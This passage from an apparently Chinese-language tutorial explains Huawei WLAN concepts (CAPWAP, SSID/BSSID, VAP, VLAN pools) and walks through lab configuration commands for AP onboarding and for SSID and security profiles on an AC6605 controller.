id="基本的WLAN组网架构"><a href="#基本的WLAN组网架构" class="headerlink" title="基本的WLAN组网架构"></a>基本的WLAN组网架构</h3><p><img src="/../img/img_artical/net_sec/7.5.5.png" alt="7.5.5"></p><h3 id="有线侧组网概念：CAPWAP协议"><a href="#有线侧组网概念：CAPWAP协议" class="headerlink" title="有线侧组网概念：CAPWAP协议"></a>有线侧组网概念：CAPWAP协议</h3><p><strong>CAPWAP隧道</strong></p><ul><li>CAPWAP：无线接入点控制和配置协议</li><li>作用：<ul><li>通过该协议让AC对AP进行管理和配置，即AC通过CAPWAP隧道来实现对AP的集中管理和控制,  配置下发</li><li>CAPWAP是基于UDP进行传输的应用层协议</li><li>CAPWAP协议在传输层运输两种类型的消息：<ul><li>业务数据流量：手机和电脑访问互联网的数据报文，称为业务数据流量，端口为UDP端口5247</li><li>管理流量：AC控制AP的协议的控制报文，称为管理流量，端口为UDP端口5246</li></ul></li></ul></li></ul><p><strong>CAPWAP隧道功能</strong></p><ul><li>AC通过CAPWAP隧道来实现对AP的集中管理，业务配置和控制</li></ul><p><img src="/../img/img_artical/net_sec/7.5.6.png" alt="7.5.6"></p><h3 id="有线侧组网概念：AP-AC组网方式"><a href="#有线侧组网概念：AP-AC组网方式" class="headerlink" title="有线侧组网概念：AP-AC组网方式"></a>有线侧组网概念：AP-AC组网方式</h3><p><strong>AP和AC间的组网分为：二层组网和三层组网</strong></p><p><img src="/../img/img_artical/net_sec/7.5.7.png" alt="7.5.7"></p><h3 id="有线侧组网概念：AC连接方式"><a href="#有线侧组网概念：AC连接方式" class="headerlink" title="有线侧组网概念：AC连接方式"></a>有线侧组网概念：AC连接方式</h3><p><strong>AC的连接方式分为：直连式组网和旁挂式组网</strong></p><p><img src="/../img/img_artical/net_sec/7.5.8.png" alt="7.5.8"></p><h3 id="无线侧组网概念：BSS-SSID-BSSID"><a href="#无线侧组网概念：BSS-SSID-BSSID" class="headerlink" title="无线侧组网概念：BSS&#x2F;SSID&#x2F;BSSID"></a>无线侧组网概念：BSS&#x2F;SSID&#x2F;BSSID</h3><p><strong>基本服务集BSS（Basic Service Set）：</strong></p><ul><li>一个AP所覆盖的范围</li><li>在一个BSS的服务区域内，STA可以相互通信</li><li>为了区分BSS，每个BSS都有唯一的BSSID，用AP的MAC地址来做BSSID，BSSID是MAC地址，特别不容易记忆，用SSID来表示</li></ul><p><strong>基本服务集标识符BSSID（Basic Service Set Identifier）：</strong></p><ul><li>是无线网络的一个身份标识，用AP的MAC地址表示</li></ul><p><strong>服务集标识符SSID（Service Set Identifier）：</strong></p><ul><li>是无线网络的一个身份标识，用字符串表示</li><li>为了便于用户辩护不同的无线网络，用SSID代替BSSID</li></ul><p><img src="/../img/img_artical/net_sec/7.5.9.png" alt="7.5.9"></p><h3 id="无线侧组网概念：VAP"><a href="#无线侧组网概念：VAP" class="headerlink" title="无线侧组网概念：VAP"></a>无线侧组网概念：VAP</h3><p><strong>虚拟接入点VAP（Virtual Access Point）：</strong></p><ul><li>VAP就是一个物理实体AP上虚拟出的多个AP</li><li>每一个被虚拟出的AP就是一个VAP，每个VAP提供和物理实体AP一样的功能</li><li>每个VAP对应一个BSS，这样一个APP，就可以提供多个BSS，设置不同的SSID</li><li>早期的AP只支持1个BSS，如果在同一空间内部部署多个BSS，则需要安放多个AP，这不但增加成本，还占用了信道资源，为了改善这种状况，现在的AP通常支持创建多个虚拟AP</li></ul><h3 id="无线侧组网概念：VLAN-Pool"><a href="#无线侧组网概念：VLAN-Pool" class="headerlink" title="无线侧组网概念：VLAN Pool"></a>无线侧组网概念：VLAN Pool</h3><p><strong>现有网络面临的挑战</strong></p><ul><li><p>在无线网络环境下，使用手机或者平板上网很多，无线网络下，用户移动性增强，可能导致某一个区域IP地址请求较多。</p></li><li><p>通常情况下，一个SSID只能对应一个业务VLAN，通常一个VLAN对应一个C类地址池，只有253个可以分发的IP地址，如果在同一个VLAN内，扩大地址池范围，会导致广播报文增多</p></li><li><p>VLAN Pool：就是VLAN池， 就是把多个VLAN放在一个VLAN池子中</p></li></ul><p><strong>VLAN Pool 的优势</strong></p><ul><li><p>VLAN pool配置为无线用户的业务VLAN，实现一个SSID能够同时支持多个业务VLAN。</p></li><li><p>新接入的用户会被动态地分配到VLAN pool中的各个VLAN中，减少了单个VLAN下的用户数，缩小了广播域；同时每个VLAN尽量均匀地分配IP地址，减少了IP地址的浪费。</p></li></ul><p><strong>VLAN pool分配方式</strong></p><ul><li><p>顺序分配算法：把用户按上线顺序依次划分到不同的VLAN中</p></li><li><p>HASH分配算法：根据用户MAC地址HASH值分配VLAN，华为默认是HASH分配算法</p></li><li><p>配置命令：</p><ul><li><strong>assignment</strong>命令用来配置VLAN pool中的VLAN分配算法</li><li><strong>undo assignment</strong>命令用来恢复VLAN pool中的VLAN分配算法为缺省值</li></ul></li></ul><p><strong>分配VLAN流程</strong></p><ul><li><p>用户终端从VAP接入，判断VAP是否有绑定VLAN Pool</p></li><li><p>如果该VAP模板绑定了VLANPool，使用VLANPool分配一个VLAN</p></li><li><p>给终端分配一个VLAN</p></li><li><p>终端从VLANPool分配的VLAN上线</p></li></ul><h2 id="WLAN工作流程"><a href="#WLAN工作流程" class="headerlink" title="WLAN工作流程"></a>WLAN工作流程</h2><h3 id="WLAN工作流程概述"><a href="#WLAN工作流程概述" class="headerlink" title="WLAN工作流程概述"></a>WLAN工作流程概述</h3><p><strong>WLAN工作流程</strong></p><ul><li>AP上线</li><li>WLAN业务配置下发</li><li>STA接入</li><li>WLAN业务数据转发</li></ul><h3 id="WLAN工作流程：步骤1"><a href="#WLAN工作流程：步骤1" class="headerlink" title="WLAN工作流程：步骤1"></a>WLAN工作流程：步骤1</h3><p><strong>AP上线</strong></p><ul><li>AP获取IP地址</li><li>AP发现AC并与之建立CAPWAP隧道</li><li>AP接入</li></ul><h3 id="AP获取IP地址：DHCP方式"><a href="#AP获取IP地址：DHCP方式" class="headerlink" title="AP获取IP地址：DHCP方式"></a>AP获取IP地址：DHCP方式</h3><p><strong>AP必须获得IP地址才能够与AC通信，WLAN网络才能够正常工作</strong></p><p><img src="/../img/img_artical/net_sec/7.5.10.png" alt="7.5.10"></p><h3 id="CAPWAP隧道建立"><a href="#CAPWAP隧道建立" class="headerlink" title="CAPWAP隧道建立"></a>CAPWAP隧道建立</h3><p><strong>AC通过CAPWAP隧道来实现对AP的集中管理和控制</strong></p><p><img src="/../img/img_artical/net_sec/7.5.11.png" alt="7.5.11"></p><h3 id="AP动态发现AC"><a href="#AP动态发现AC" class="headerlink" title="AP动态发现AC"></a>AP动态发现AC</h3><p><strong>DHCP报文中携带Option 43</strong></p><ul><li>在DHCP服务器上配置DHCP报文中携带Option 43，且Option 43携带AC的IP地址</li></ul><p><img src="/../img/img_artical/net_sec/7.5.12.png" alt="7.5.12"></p><h3 id="建立CAPWAP隧道"><a href="#建立CAPWAP隧道" class="headerlink" title="建立CAPWAP隧道"></a>建立CAPWAP隧道</h3><p><strong>AP与AC关联，完成CAPWAP隧道建立</strong></p><p><strong>CAPWAP隧道包括数据隧道和控制隧道</strong></p><ul><li>数据隧道：AP的业务报文（数据流量）</li><li>控制隧道：AP与AC之间的控制报文（管理流量）</li></ul><p><img src="/../img/img_artical/net_sec/7.5.13.png" alt="7.5.13"></p><h3 id="AP接入"><a href="#AP接入" class="headerlink" title="AP接入"></a>AP接入</h3><p><strong>AC上添加AP的方式</strong></p><ul><li>离线导入AP：预先配置AP的MAC地址，当AP与AC连接时，如果AC发现AP和预先增加的AP的MAC地址匹配，则AC开始与AP建立连接</li></ul><h3 id="为确保AP上线，AC需配置内容"><a href="#为确保AP上线，AC需配置内容" class="headerlink" title="为确保AP上线，AC需配置内容"></a>为确保AP上线，AC需配置内容</h3><p><img src="/../img/img_artical/net_sec/7.5.14.png" alt="7.5.14"></p><h3 id="WLAN业务下发"><a href="#WLAN业务下发" class="headerlink" title="WLAN业务下发"></a>WLAN业务下发</h3><p><strong>AP上线后，首先会主动向AC获取当前配置，而后统一由AC对AP进行集中管理和业务配置下发</strong></p><p><img src="/../img/img_artical/net_sec/7.5.15.png" alt="7.5.15"></p><h3 id="配置模板"><a href="#配置模板" class="headerlink" title="配置模板"></a>配置模板</h3><p><strong>为了方便用户配置和维护WLAN的各个功能，针对WLAN的不同功能和特性设计了各种类型的模板，这些模板统称为WLAN模板</strong></p><p><img src="/../img/img_artical/net_sec/7.5.16.png" alt="7.5.16"></p><h3 id="VAP模板"><a href="#VAP模板" class="headerlink" title="VAP模板"></a>VAP模板</h3><p><img src="/../img/img_artical/net_sec/7.5.17.png" alt="7.5.17"></p><h3 id="无线接入安全协议"><a href="#无线接入安全协议" class="headerlink" title="无线接入安全协议"></a>无线接入安全协议</h3><p><strong>安全性称为阻碍WLAN技术发展的最重要因素</strong></p><p><strong>常用安全策略</strong></p><p><img src="/../img/img_artical/net_sec/7.5.18.png" alt="7.5.18"></p><h3 id="STA地址分配"><a href="#STA地址分配" class="headerlink" title="STA地址分配"></a>STA地址分配</h3><p><strong>STA获取到自身的IP地址，是STA正常上线的前提条件</strong></p><p><img src="/../img/img_artical/net_sec/7.5.19.png" alt="7.5.19"></p><h3 id="数据转发方式"><a href="#数据转发方式" class="headerlink" title="数据转发方式"></a>数据转发方式</h3><p><img src="/../img/img_artical/net_sec/7.5.20.png" alt="7.5.20"></p><h2 id="AP上线配置"><a href="#AP上线配置" class="headerlink" title="AP上线配置"></a>AP上线配置</h2><h3 id="AP上线"><a href="#AP上线" class="headerlink" title="AP上线"></a>AP上线</h3><p><img src="/../img/img_artical/net_sec/7.5.21.png" alt="7.5.21"></p><h3 id="案例需求"><a href="#案例需求" class="headerlink" title="案例需求"></a>案例需求</h3><ul><li>无线控制器（AC）连接在核心交换机SW2上，属于VLAN200</li><li>AP连接在汇聚层交换机SW1上，AP的管理IP地址属于VLAN100</li><li>企业内网中存在4个VLAN，分别服务于老师和学生</li><li>AP的网关以及所有无线用户的终端的网关，都配置在核心交换机SW2</li><li>AP和无线用户终端的IP地址都是通过DHCP的方式获得</li><li>最终确保连接到不同AP的无线终端之间可以互通</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>AP上线</strong></p><ul><li>让AP可以通过DHCP获取IP地址</li><li>在AC和AP之间建立capwap隧道</li><li>AP接入</li></ul><h3 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>第一步：AP上线</strong></p><ul><li>让AP可以通过DHCP获取IP地址</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1.汇聚交换机创建VLAN，配置端口角色</span></span><br><span class="line"><span class="attr">[HJ-SW1]vlan</span> <span class="string">batch 100 200 210</span></span><br><span class="line"><span class="attr">[HJ-SW1]port-group</span> <span class="string">group-member g0/0/1 to g0/0/5</span></span><br><span class="line"><span class="attr">[HJ-SW1-port-group]port</span> <span class="string">link-type trunk</span></span><br><span class="line"><span class="attr">[HJ-SW1-port-group]port</span> <span class="string">trunk allow-pass vlan all</span></span><br><span class="line"></span><br><span class="line"><span class="attr">2.核心交换机创建VLAN,配置端口角色</span></span><br><span class="line"><span class="attr">[HX-SW2]vlan</span> <span class="string">batch 100 200 210</span></span><br><span class="line"><span class="attr">[HX-SW2]interface</span> <span class="string">g0/0/2</span></span><br><span class="line"><span class="attr">[HX-SW2-G0/0/2]port</span> <span class="string">link-type trunk</span></span><br><span class="line"><span class="attr">[HX-SW2-G0/0/2]port</span> <span class="string">trunk allow-pass vlan all</span></span><br><span class="line"><span class="attr">[HX-SW2-G0/0/2]interface</span> <span class="string">g0/0/1</span></span><br><span class="line"><span class="attr">[HX-SW2-G0/0/1]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[HX-SW2-G0/0/1]port</span> <span class="string">default vlan 210</span></span><br><span class="line"><span class="attr">[HX-SW2-G0/0/1]interface</span> <span class="string">g0/0/10</span></span><br><span class="line"><span class="attr">[HX-SW2-G0/0/10]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[HX-SW2-G0/0/10]port</span> <span class="string">default vlan 200</span></span><br><span class="line"></span><br><span class="line"><span class="attr">3.DHCP-R1配置DHCP功能，配置IP地址池</span></span><br><span class="line"><span class="attr">[DHCP-R1]dhcp</span> <span class="string">enable</span></span><br><span class="line"><span class="attr">[DHCP-R1]ip</span> <span class="string">pool vlan100</span></span><br><span class="line"><span class="attr">[DHCP-R1-pool-vlan100]network</span> <span class="string">192.168.100.0 mask 24</span></span><br><span class="line"><span class="attr">[DHCP-R1-pool-vlan100]gateway-list</span> <span class="string">192.168.100.254</span></span><br><span class="line"><span class="attr">[DHCP-R1-pool-vlan100]dns-list</span> <span class="string">8.8.8.8</span></span><br><span class="line"><span class="attr">[DHCP-R1-pool-vlan100]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[DHCP-R1]interface</span> <span class="string">g0/0/0</span></span><br><span class="line"><span class="attr">[DHCP-R1-G0/0/0]ip</span> <span class="string">address 192.168.210.1 24</span></span><br><span class="line"><span class="attr">[DHCP-R1-G0/0/0]dhcp</span> <span class="string">select global</span></span><br><span class="line"></span><br><span class="line"><span class="attr">4.核心交换机SW2配置VLANIF网关地址</span></span><br><span class="line"><span class="attr">[HX-SW2]interface</span> <span class="string">vlanif 100</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif100]ip</span> <span class="string">address 192.168.100.254 24</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif100]interface</span> <span class="string">vlanif 200</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif200]ip</span> <span class="string">address 192.168.200.254 24</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif200]interface</span> <span class="string">vlanif 210</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif210]ip</span> <span class="string">address 192.168.210.254 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">5.核心交换机SW2配置DHCP中继</span></span><br><span class="line"><span class="attr">[HX-SW2]dhcp</span> <span class="string">enable</span></span><br><span class="line"><span class="attr">[HX-SW2]interface</span> <span class="string">vlanif 100</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif100]dhcp</span> <span class="string">select relay</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif100]dhcp</span> <span class="string">relay server-ip 192.168.210.1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">6.在HJ-SW1中修改g0/0/2</span> <span class="string">- g0/0/5的pvid为vlan100</span></span><br><span class="line"><span class="attr">[HJ-SW1]port-group</span> <span class="string">group-member g0/0/2 to g0/0/5</span></span><br><span class="line"><span class="attr">[HJ-SW1-port-group]port</span> <span class="string">trunk pvid vlan 100</span></span><br><span class="line"></span><br><span class="line"><span class="attr">7.DHCP-R1配置去往中继的回程路由</span></span><br><span class="line"><span class="attr">[DHCP-R1]ip</span> <span class="string">route-static 0.0.0.0 0 192.168.210.254</span></span><br></pre></td></tr></table></figure><ul><li>在AC和AP之间建立CAPWAP隧道</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1.在AC中创建vlan200并且把g0/0/10加入vlan200，改为access</span></span><br><span class="line"><span class="attr">[AC6605]vlan</span> <span class="string">200</span></span><br><span class="line"><span class="attr">[AC6605-vlan200]quit</span></span><br><span class="line"><span class="attr">[AC6605]interface</span> <span class="string">g0/0/10</span></span><br><span class="line"><span class="attr">[AC6605-G0/0/10]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[AC6605-G0/0/10]port</span> <span class="string">default vlan 200</span></span><br><span class="line"><span class="attr">[AC6605-G0/0/10]interface</span> <span class="string">vlanif 200</span></span><br><span class="line"><span class="attr">[AC6605-vlanif200]ip</span> <span class="string">address 192.168.200.10 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">2.在AC中配置默认路由，能够实现和AP互联互通</span></span><br><span class="line"><span class="attr">[AC6605]ip</span> <span class="string">route-static 0.0.0.0 0 192.168.200.254</span></span><br><span class="line"></span><br><span class="line"><span class="attr">3.在DHCP服务中配置dhcp</span> <span class="string">option 43：让AP知道AC的管理地址</span></span><br><span class="line"><span class="attr">[DHCP-R1]ip</span> <span class="string">pool vlan100</span></span><br><span class="line"><span class="attr">[DHCP-R1-pool-vlan100]option</span> <span class="string">43 sub-option 1 ip-address 192.168.200.10</span></span><br><span class="line"><span class="attr">备注：修改完option43后记得重启所有AP</span></span><br><span class="line"></span><br><span class="line"><span class="attr">4.在AC中配置capwap隧道</span></span><br><span class="line"><span class="attr">[AC6605]capwap</span> <span class="string">source ip-address 192.168.200.10</span></span><br></pre></td></tr></table></figure><ul><li>AP接入</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1.在AP上查询MAC地址</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;display</span>  <span class="string">system-information</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address :  00:e0:fc:c3:76:60</span></span><br><span class="line"></span><br><span class="line"><span class="attr">2.在AC中填入AP的MAC地址</span></span><br><span class="line"><span class="attr">[AC6605]wlan</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-id</span> <span class="string">1 ap-mac 00e0-fcc3-7660</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-1]quit</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-id</span> <span class="string">2 ap-mac 00e0-fc8b-0150</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-2]quit</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-id</span> <span class="string">3 ap-mac 00e0-fc1b-4300</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-3]quit</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-id</span> <span class="string">4 ap-mac 00e0-fc7e-39c0</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-4]quit</span></span><br></pre></td></tr></table></figure><h2 id="WLAN业务配置下发"><a href="#WLAN业务配置下发" class="headerlink" title="WLAN业务配置下发"></a>WLAN业务配置下发</h2><h3 id="案例需求-1"><a href="#案例需求-1" class="headerlink" title="案例需求"></a>案例需求</h3><ul><li>企业内网的无线网络改造已经完成大部分工作，AP成功注册到AC</li><li>基于分配好的IP方案，为不同的无线终端，动态分配IP地址</li><li>配置AC，为不同的AP下发不同的配置，确保可以发射无线信号</li><li>实现不同的“无线终端”可以成功连接AP，并成功获得IP地址</li><li>实现不同的“无线终端”之间的互通</li></ul><h3 id="配置命令-1"><a href="#配置命令-1" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>第一步：AC下发WLAN配置给AP</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1.创建域管理模板-绑定国家码</span></span><br><span class="line"><span class="attr">[AC6605]wlan</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]regulatory-domain-profile</span> <span class="string">name ntd     //创建域管理模板</span></span><br><span class="line"><span class="attr">[AC6605-wlan-regulate-domain-ntd]country-code</span> <span class="string">cn         //定义国家码</span></span><br><span class="line"></span><br><span class="line"><span class="attr">2.绑定域管理模板</span></span><br><span class="line"><span class="attr">[AC6605]wlan</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-group</span> <span class="string">name bangong    //创建AP组</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-group-bangong]regulatory-domain-profile</span> <span class="string">ntd</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-group-bangong]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-group</span> <span class="string">name xuexi</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-group-xuexi]regulatory-domain-profile</span> <span class="string">ntd</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-group-xuexi]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">3.在AP组里添加AP设备</span></span><br><span class="line"><span class="attr">[AC6605]wlan</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-id</span> <span class="string">1           //配置1号ap</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-1]ap-name</span> <span class="string">bangong1  //修改ap-name为bangong1</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-1]ap-group</span> <span class="string">bangong  //把ap1加入bangong组</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-1]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-id</span> <span class="string">2           //配置2号ap</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-2]ap-name</span> <span class="string">bangong2  //修改ap-name为bangong2</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-2]ap-group</span> <span class="string">bangong  //把ap2加入bangong组</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-2]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-id</span> <span class="string">3           //配置3号ap</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-3]ap-name</span> <span class="string">xuexi1    //修改ap-name为xuexi1</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-3]ap-group</span> <span class="string">xuexi    //把ap3加入xuexi组</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-3]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-id</span> <span class="string">4           //配置4号ap</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-4]ap-name</span> <span class="string">xuexi2    //修改ap-name为xuexi2</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-4]ap-group</span> <span class="string">xuexi    //把ap4加入xuexi组</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-4]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">4.验证</span></span><br><span class="line"><span class="attr">[AC6605]display</span> <span class="string">ap-group all</span></span><br><span class="line"></span><br><span class="line"><span class="attr">5.创建SSID模板-定义无线网名</span></span><br><span class="line"><span class="attr">[AC6605]wlan</span>                                   <span class="string">//进入wlan</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ssid-profile</span> <span class="string">name bangong    //创建SSID模板，命名为bangong</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ssid-prof-bangong]ssid</span> <span class="string">bangong    //定义无线网的名字，命名为bangong</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ssid-prof-bangong]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ssid-profile</span> <span class="string">name xuexi</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ssid-prof-xuexi]ssid</span> <span class="string">xuexi</span></span><br><span class="line"></span><br><span class="line"><span class="attr">6.创建安全模板-定义无线网安全策略预共享密钥，加密方式</span></span><br><span class="line"><span class="attr">[AC6605]wlan</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]security-profile</span> <span class="string">name bangong</span></span><br><span class="line"><span class="attr">[AC6605-wlan-sec-prof-bangong]security</span> <span class="string">wpa-wpa2 psk pass-phrase a12345678 aes</span></span><br><span class="line"><span class="attr">[AC6605-wlan-sec-prof-bangong]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AC6605-wlan-view]security-profile</span> <span class="string">name xuexi</span></span><br><span class="line"><span class="attr">[AC6605-wlan-sec-prof-xuexi]security</span> <span class="string">wpa-wpa2 psk pass-phrase a12345678 aes</span></span><br><span class="line"></span><br><span class="line"><span class="attr">7.创建VLAN池-绑定多个VLAN</span>:<span class="string">给STA(电脑和手机)用的VLAN</span></span><br><span class="line"><span class="attr">[AC6605]vlan</span> <span class="string">pool bangong                  //创建vlan池，命名为bangong</span></span><br><span class="line"><span class="attr">[AC6605-vlan-pool-bangong]vlan</span> <span class="string">101 102     //向vlan池添加vlan101和vlan102</span></span><br><span class="line"><span class="attr">[AC6605-vlan-pool-bangong]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AC6605]vlan</span> <span class="string">pool xuexi</span></span><br><span class="line"><span class="attr">[AC6605-vlan-pool-xuexi]vlan</span> <span class="string">103 104</span></span><br><span class="line"></span><br><span class="line"><span class="attr">8.创建VAP模板--绑定VLAN池子，绑定SSID配置文件，绑定安全配置文件</span></span><br><span class="line"><span class="attr">[AC6605]wlan</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]vap-profile</span> <span class="string">name bangong                    //创建vap模板，命名为bangong</span></span><br><span class="line"><span class="attr">[AC6605-wlan-vap-prof-bangong]ssid-profile</span> <span class="string">bangong            //绑定ssid模板</span></span><br><span class="line"><span class="attr">[AC6605-wlan-vap-prof-bangong]security-profile</span> <span class="string">bangong        